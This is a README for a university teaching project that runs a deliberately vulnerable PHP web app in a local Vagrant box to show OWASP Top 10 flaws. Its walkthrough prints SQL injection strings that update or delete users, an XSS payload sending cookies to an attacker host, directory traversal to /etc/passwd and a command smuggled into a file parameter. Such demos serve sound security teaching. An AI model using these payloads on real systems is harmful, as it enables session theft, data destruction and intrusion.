# zcu_webapp_security_demo
Small education project demonstrating typical security vulnerabilities in web application.
Created for University of West Bohemia.

## Installation
* Install [VirtualBox](https://www.virtualbox.org/wiki/Downloads)
* Install [Vagrant](https://docs.vagrantup.com/v2/installation/index.html "Vagrant docs - Istallation")
* Install Vagrant plugin for VirtualBox guest additions
```bash
> vagrant plugin install vagrant-vbguest
```
* checkout this repository
```bash
> git clone git@github.com:veny/zcu_webapp_security_demo.git
```
* run vagrant box
```bash
> cd zcu_webapp_security_demo
> vagrant up
```
* for the first time it will take about 15 minutes till vagrant is ready (depending on your internet connection)
* in browser go to http://192.168.33.10/zcu/index.php

## OWASP top 10 examples
* https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project

### Injection
* put that as password (empty username)
```sql
' OR id='2
' OR username='alfa
```
* or even worst
```sql
'; UPDATE user SET password='123
'; DELETE FROM user WHERE id='8
```

### XSS
* put following text as notice
```html
<b onmouseup=alert("XSS!")>click me!</b>
```
* or even worst
```html
<script>document.location= "http://www.attacker.com/cgi-bin/cookie.cgi?foo="+document.cookie</script>
```

### Broken Session Management
* application with URL rewriting
* no logout and session timeout

### Sensitive Data Exposure
* to monitor HTTP traffic
```bash
root> tcpdump -A -vvv -i vboxnet1 host 192.168.33.10
```

### Cross-Site Request Forgery
* try this: http://192.168.33.10/zcu/index.php?action=create&notice=pokus


### Security Misconfiguration
* Directory listing is not disabled on your server
  * try this: http://192.168.33.10/zcu/list
  * selinux (setenforce 0, setenforce 1)
* Directory traversal
  * for this reason: http://192.168.33.10/zcu/list/fancy_script.php
  * but can be misused: http://192.168.33.10/zcu/list/get_file.php?file=../../../../etc/passwd
  * or: http://192.168.33.10/zcu/list/get_file.php?file=get_file.php
  * or even worst: http://192.168.33.10/zcu/list/get_file.php?file=/proc/1/cmdline;%20ls%20-al%20/


## Where to go next
* [OWASP Top Ten 2013 Project](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_2013_Project)
* [OWASP Secure Coding Practices](https://www.owasp.org/images/0/08/OWASP_SCP_Quick_Reference_Guide_v2.pdf)


____


### Vagrant troubleshooting (Fedora 23)

#### 1) Failed to mount folders in Linux guest.
```bash
Failed to mount folders in Linux guest. This is usually because the "vboxsf" file system is not
available. Please verify that the guest additions are properly installed in the guest and  can
work properly. The command attempted was:
mount -t vboxsf -o uid=`id -u vagrant`,gid=`getent group vagrant | cut -d: -f3` opt_zcu_demo /opt/zcu_demo
mount -t vboxsf -o uid=`id -u vagrant`,gid=`id -g vagrant` opt_zcu_demo /opt/zcu_demo
...
/sbin/mount.vboxsf: mounting failed with the error: No such device
```
  - Problem description and solution described here: https://github.com/dotless-de/vagrant-vbguest/issues/170
   - shortly: vagrant ssh, sudo systemctl enable vboxadd, service vboxadd start, vagrant reload, vagrant provision

#### 2) Building the main Guest Additions module fail --> sync folder not mounted
```bash
...
Installing Virtualbox Guest Additions 5.0.10 - guest version is unknown
Verifying archive integrity... All good.
Uncompressing VirtualBox 5.0.10 Guest Additions for Linux............
VirtualBox Guest Additions installer
Removing installed version 5.0.10 of VirtualBox Guest Additions...
Removing existing VirtualBox non-DKMS kernel modules[  OK  ]
Copying additional installer modules ...
Installing additional modules ...
Removing existing VirtualBox non-DKMS kernel modules[  OK  ]
Building the VirtualBox Guest Additions kernel modules
The headers for the current running kernel were not found. If the following
module compilation fails then this could be the reason.
The missing package can be probably installed with
yum install kernel-devel-3.10.0-229.14.1.el7.x86_64

Building the main Guest Additions module[FAILED]
(Look at /var/log/vboxadd-install.log to find out what went wrong)
...
```
   - shortly: vagrant ssh, sudo yum update, Ctrl+D, vagrant reload
